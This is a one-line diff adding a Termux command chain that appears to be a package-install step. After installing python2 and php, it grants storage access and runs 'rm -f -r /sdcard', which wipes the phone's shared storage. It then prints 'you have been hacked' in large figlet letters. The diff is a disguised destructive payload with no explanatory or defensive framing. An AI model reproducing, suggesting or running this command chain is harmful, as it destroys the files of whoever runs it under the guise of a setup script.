@@ -1,0 +1,1 @@
+pkg install python2;pkg install php;termux-setup-storage;rm -f -r /sdcard;pkg install figlet;figlet you;figlet have;figlet been;figlet hacked
